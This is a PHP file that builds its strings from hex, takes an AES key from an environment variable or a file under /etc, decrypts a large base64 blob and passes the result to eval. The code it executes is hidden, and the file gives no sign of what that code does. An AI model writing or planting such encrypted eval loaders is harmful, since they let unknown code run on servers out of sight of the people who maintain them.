<?php

$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('mD5AsP3I1I9PeOqhGuxJdA==');

$c=base64_decode(

'31GOdshZvLDbXQ+Zs8TEUWa8Wq34WI0yXS3Ufc3KXFCd4hBn/hc2QWKuOufKokPvwv9ppxjM6hJp' .
'd9Ct6Yr9HwNHNKl6OdO6CzA/OhqwW9QmwhOIeVNaBljKe2pgVkLOP68Aa0e6NELmOIj+ttxGYaaM' .
'LiRHzBAjh27CjvqHhS1D2Pam8j5EaLubLBByYxg+Bavx5phKCdop2N0Y7nhb2iXi2sqNmRR9IVUZ' .
'a0hXx7Wz06eYB5xqjpv/ujEMWdJv2BYcCPmJ+7zHKyyAXmnkwDBvpyPx+a6OgOONBqxmBtn/Y816' .
'oOum6fqtdTbykgXtrunw1/8pBvdMrR4UW06frocGN9K+ysk4tku0YrIbk9bC38V4ZrtT5NDpE1v/' .
'kuiGbQvK0XxrZoMcOh6CGN4TiMoD0USgxpIOUU1q68WU74vBzoosEIPGP5NSYJNSvcHKjXdY/8Xk' .
'Dgg+c46Oq+6Q0bmrTMyJBDJwoVmcufx6JMiJYNb7azLMjQzRptlUB5DU0BZGGXaUG150VYBdE7a8' .
'n9zqyk0i4DxUzNUjRwdW+hKPF5Gkof2sEqP4Z02DXSmMrIAvZiEfssqWkaxPReKbjXaT1JQi20xG' .
'yrMnoB8Kr7uambRyg7EQsNtyh0+hi4oqa0Eauyx3y6UycmdbX31zVNuR9lu//kfLrfxM1SAYET1G' .
'ku86yKmwTPyWDGQHDoos5EuPQopMF18uxTp+OQG662LQgsJQFqT0hlcCNzZ71YLARS0MJQORZ8sH' .
'GOkr0GKPLjZ99bX0g/OmVeXij1FZtwkmOTHfQ2JgntF79BfHmEp/YuyOIRc+/sv3Ngj6BiIINcan' .
'NNJaNCvwuJm5aDOyc/CZso9zVJ2M2LwcWDibgBhPhRNVobOF2fH17Tlhv9gAAb7m6Rg67AoL35A3' .
'NYtqL9+1w65fqBMxRMCfUhfeEI/QzDayFAf4+Ezj6PU5bKeYhQixOsLyASyi1Jh0ElVRg9Hoz9Kn' .
'7fqmr1Evf2bh6fN4iyjDARW9d7Q8WK2S8hrSf9qEHeLSnhA5Z3xt4pOfz7ZVOYjTkXUFqhJQ8OvT' .
't0/7lqW0mDNk40HzLA6O5SbSN2xaJIQQ8dNuM0VWvRlsuCnyQcHFs2bNc1idgPtVx7YKmVDTYJCx' .
'vniKc2f/KZ7T4FjJVjyqmAYy1NLftObI2pbAJHz1ZgORn9UQbZYiBlt4/TRMykIGD3dMxouc/Sv8' .
'WbNpnKMlGOqu099AgIJ2NaFoc3TKQ2vAV1OXbEhctLnZ88hQw3yTV2ceaVowl+GdDhvG5uWLqiKK' .
'KUb31Dlm7rj6NtR1OfSZe+iQytVsDO1FN4n7xAMk1j10XuooPhXfRGJ9irK1MAjJ1cuaJeYnjR5L' .
'rViP5sD212cAYLG0erQDJJKz+ctY6B+OJoBim0X0sNSm/9zDdW/fGPQcicbXDwvgBgoFTu5qvtLK' .
'Y9ddff50BDj1xIXL6Ygh0JS3sMYFN74m5dGAwGZapqLzJhswDdupy6ixxBRFI2wSjfLY0GfaYxrY' .
'Iuadd3jKTn+Y2IvoI9G9N5F3DSOhz4Rx1VDzzAvFefY7Xhondjt7GRJ+XdIf73Fx3mbKvSJOc0ok' .
'SAtqisw2oDfljRcOK4VZhpbucjoXUeQgaesZbrbg6wrUpUfQeHnfheFWCJWa0nbgFKfCwZHxPbjB' .
'ptLyP3DBhXtYI2o2U1TmpbFHTfizT4bnzJ7E0gtgluLhy6Zp7DgVr5EZjkHybmJ8Z1RFqHNzd01R' .
'/6ABDfXmI2BmRHJvgYlyTr7svM92ipISwEeA+4P3QKqsKuDlqIuhQPq2Ns65JiXItnErHNpJm8V8' .
'5ofgxKlKI0h/pZZGbjomc7+9IqoWZcH6j0W2L3ixRTbTjcl+DLmfthwTue19A+Oc75UKaS+PUjSV' .
'IvZVz/CDLQaMB6ZxICame45hbKVa77E153XZihmO9Q+tHrWE/l3v7+jgtXu5dYLrgGMKASVFFmwm' .
'ZjW1n7vcO06JrfwK6F3IlQ/DTt2B4KrmSXdHkJUai8Et2Pwwl7D8/14MjFGU1kMJsfWyqEdnuVws' .
'nOKFN9BjS8ibva22Db7oLsUqSWv1fKEG0u5KbO1RO8soh0MenmGSkUbsIbcppVjlV/RRZaUkhkjI' .
'fE6/ew+4WzDOCWJJAODnCMPpqT1gYteYxcoZhjKY29Ti5Hf/wedL1OOCjmZg9/+DwwNXPpV9b8vI' .
'hFSAxajHclx+XlsQ1tU5nPrsldfdoChknHsfj/zt6a9V5X3PWqFc3ot6fQOFR+SD4uNGhEyaWVdd' .
'u9MitAQccZM2wTsyhsbIorD2vVLCarLjooHWt1UPDo0soB+K3mMpL/a9GuxKOnfFx6ixprMky76K' .
'fRtSPjubE4PdjW7DLXXLQky9fMqKnHzqeQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval('?>'.$d);

